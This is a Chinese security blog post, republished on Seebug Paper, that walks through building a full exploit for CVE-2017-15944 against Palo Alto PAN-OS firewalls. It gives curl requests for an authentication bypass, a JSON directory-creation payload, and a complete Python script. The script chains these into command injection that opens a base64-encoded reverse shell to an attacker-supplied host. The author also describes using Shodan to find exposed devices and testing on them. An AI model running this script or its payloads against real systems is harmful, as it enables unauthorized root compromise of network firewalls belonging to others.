作者：栋栋的栋  
作者博客：[https://d0n9.github.io](https://d0n9.github.io/2018/01/26/CVE-2017-15944%20Palo%20Alto%E9%98%B2%E7%81%AB%E5%A2%99%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9E%84%E9%80%A0%20EXP/
"https://d0n9.github.io")

在 exploit-db 看到 CVE-2017-15944
这个漏洞，三处漏洞打出的组合拳导致最后命令执行，三环缺一不可，最喜欢这样变废为宝的利用，但是在复现构造EXP还是遇到不少“坑”，本文记录一下填坑的过程….

exploit-db 地址 <https://www.exploit-db.com/exploits/43342/>

该漏洞影响范围还是很广泛的，但是并没有看到有人放出EXP，最多只是PoC或者省去了很坑的命令执行漏洞。

    
    
    <=PAN-OS 6.1.18
    <=PAN-OS 7.0.18
    <=PAN-OS 7.1.13
    <=PAN-OS 8.0.5

三处漏洞分别为：权限绕过，任意目录创建，命令执行

不过命令执行部分的详细内容原作者并没有给出，只有 Payload ，而且还执行不成功，手头也没有设备，只好硬着头皮去 Shodan
找到环境，一点点摸索尝试构造 EXP

    
    
    $ shodan download search 'Location: /php/login.php port:"4443"' limit 3000
    $ shodan parse --fields ip_str search.json.gz

原作者给出了权限绕过的 PoC

    
    
    imac:~/pa% curl -H "Cookie: PHPSESSID=hacked;" 10.0.0.1/php/utils/debug.php
    <!DOCTYPE html>
    <html><head><title>Moved Temporarily</title></head>
    <body><h1>Moved Temporarily</h1>
    <p>The document has moved <a href="http://10.0.0.1:28250/php/logout.php
    ">here</a>.</p>
    <address>PanWeb Server/ -  at 127.0.0.1:28250 Port 80</address></body>
    </html>
    imac:~/pa% curl -H "Cookie: PHPSESSID=hacked;" '
    10.0.0.1/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'
    @start@Success@end@
    imac:~/pa% curl -H "Cookie: PHPSESSID=hacked;" 10.0.0.1/php/utils/debug.php
    2>/dev/null|head -30
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "
    http://www.w3.org/TR/html4/loose.dtd";>
    <html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>Debug Console</title>

这一步的漏洞详情描述最复杂，英文阅读能力跟不上看地也是云里雾里的…

PoC 就很简单了，其实这个漏洞总结一句话就是可以设置任意 cookie 绕过页面的权限认证

先访问 `/php/utils/debug.php` ，然而访问
`/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27”;user|s.”1337”;`
再访问`/php/utils/debug.php`便绕过了认证

![](https://images.seebug.org/content/images/2018/03/9016465a-cd09-4afd-8360-0db642ffd634.jpg-w331s)

任意目录创建使用前面设置的cookie POST JSON 请求到
`/php/utils/router.php/Administrator.get`，如果成功便会在`/opt/pancfg/session/pan/user_tmp/{cookie
value}/{jobid}.xml` 创建一个目录和临时文件，目录就是下面Payload的cookie值，可以用../跳目录，jobid
是应该是创建的任务，在response中会返回。

    
    
    {"action":"PanDirect","method":"execute","data":
    ["07c5807d0d927dcd0980f86024e5208b","Administrator.get",
    {"changeMyPassword":true,"template":"asd","id":"admin']\"
    async-mode='yes' refresh='yes'
    cookie='../../../../../../tmp/hacked'/>\u0000"}],"type":"rpc","tid":713}

我在测试的时候遇到一个小问题，复制的payload 一直返回 `{“type”:”exception”,”tid”:””,”message”:”Call
to undefined class: “}` ，这就很尴尬了，因为我既没有设备也没有代码，只能确定这肯定是一个报错，但并不知道怎么解决。

emmmm，检查之后发现一处“坑”

![](https://images.seebug.org/content/images/2018/03/40601d45-8247-40fb-aae2-57f6def3d6cf.jpg-w331s)

标红线的位置应该要有空格的，但是由于是copy的原因，空格可能就被换行替代了

![](https://images.seebug.org/content/images/2018/03/fa65b62d-c099-476e-99b1-57aacd89d620.jpg-w331s)

如果看到这样的response返回那么就是成功了

其实命令执行漏洞也要配合这里任意创建目录才能完成攻击，但是最关键的细节却被原隐藏了

![](https://images.seebug.org/content/images/2018/03/0cf1bf5f-a5da-49b9-b25d-d5ed8643195a.jpg-w331s)

大概知道环境是crontab 执行脚本，两个脚本之间调用（genindex_batch.sh 调用
genindex.sh），`$PAN_BASE_DIR/logdb/$dir/1`
是出现漏洞的代码，大概是$dir可控，但是文中提到的find却不知道是何作用。

不过好在原作者给出了EXP示例

    
    
    * -print -exec python -c exec("[base64 code..]".decode("base64")) ;

熟悉find命令的同学肯定知道 `-print -exec` 的作用，不熟悉也没有关系，可以man find进行查看，

![](https://images.seebug.org/content/images/2018/03/d7339819-ab1c-49d6-8e00-d69ce5b9aeb8.jpg-w331s)
![](https://images.seebug.org/content/images/2018/03/d939a314-4d9e-4d71-9d07-8ccd1ab5ac21.jpg-w331s)

猜测genindex.sh脚本使用 find
并且目录可控，不过在这里犯了一个致命的错误，因为在命令构造的时候是在终端测试，所以要加单引号双引号不然会报错，前面说过Payload是JOSN，所以又要考虑引号转义的问题，这里抓头了一阵。

![](https://images.seebug.org/content/images/2018/03/5f362e37-160e-4996-8b2f-fce37a268186.jpg-w331s)
![](https://images.seebug.org/content/images/2018/03/f7a8db36-3a33-4dde-9605-a7ef4a88c7b9.jpg-w331s)

意识到错误之后便在sh脚本中测试命令，因为这里是隐式的命令执行，所以要利用oob的方式进行验证，要注意命令并不会立即执行，因为存在命令执行的文件是genindex.sh，而且是
genindex_batch.sh 进行调用，genindex_batch.sh 又是crontab
每隔15分钟执行一次，所以到等触发时间，这里需要注意命令可能会被多次执行，拿到shell看到源码才知道原来命令执行的地方是一个for循环。

![](https://images.seebug.org/content/images/2018/03/088f9a2d-a2fd-4ff4-a0a6-2a3b9144f060.jpg-w331s)
![](https://images.seebug.org/content/images/2018/03/0aa3f42a-3f5c-40c7-8f09-0aba5f0f9e8f.jpg-w331s)

ok，可以尝试一下写webshell，直接执行echo肯定是不行的，特殊符号问题。

所以要使用编码，原作者也是使用的这种方式，不过编码有一个特别不好的地方是长度会增加，因为这里是其实是创建文件夹，Linux文件名称最长可支持到255个字符(characters)

漏洞发现者是写webshell拿到的权限，这样权限是nobody，属于低权限，想要root权限就用反弹shell

下面给出 EXP

    
    
    #!/usr/bin/env python
    # encoding: utf-8
    import requests
    import sys
    import base64
    
    requests.packages.urllib3.disable_warnings()
    session = requests.Session()
    
    def step3_exp(lhost, lport):
        command = base64.b64encode('''exec("import os; os.system('bash -i >& /dev/tcp/{}/{} 0>&1')")'''.format(lhost, lport))
        exp_post = r'''{"action":"PanDirect","method":"execute","data":["07c5807d0d927dcd0980f86024e5208b","Administrator.get",{"changeMyPassword":true,"template":"asd","id":"admin']\" async-mode='yes' refresh='yes'  cookie='../../../../../../../../../tmp/* -print -exec python -c exec(\"'''+ command + r'''\".decode(\"base64\")) ;'/>\u0000"}],"type":"rpc","tid": 713}'''
        return exp_post
    
    def exploit(target, port):
        step1_url = 'https://{}:{}/php/utils/debug.php'.format(target, port)
        step2_url = 'https://{}:{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(target, port)
        step3_url = 'https://{}:{}/php/utils/router.php/Administrator.get'.format(target, port)
    
        try:
            if session.get(step1_url, verify=False).status_code == 200:
                if session.get(step2_url, verify=False).status_code == 200:
                    r = session.get(step1_url, verify=False)
            if 'Debug Console' in r.text:
                print '[+] bypass success'
                lhost = raw_input('[*] LHOST: ')
                if lhost:
                    print '[+] set LHOST = {}'.format(lhost)
                    lport = raw_input('[*] LPORT: ')
                else:
                    exit('[!] LHOST invalid')
                if lport:
                    print '[+] set LPORT = {}'.format(lport)
                else:
                    exit('[!] LPORT invalid')
                exp_post = step3_exp(lhost, lport)
                rce = session.post(step3_url, data=exp_post).json()
                if rce['result']['@status'] == 'success':
                    print '[+] success, please wait ... '
                    print '[+] jobID: {}'.format(rce['result']['result']['job'])
                else:
                    exit('[!] fail')
            else:
                exit('[!] bypass fail')
        except Exception, err:
            print err
    
    
    if __name__ == '__main__':
        if len(sys.argv) <= 3:
            exploit(sys.argv[1], sys.argv[2])
        else:
            exit('[+] usage: python CVE_2017_15944_EXP.py IP PORT')

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/540/>

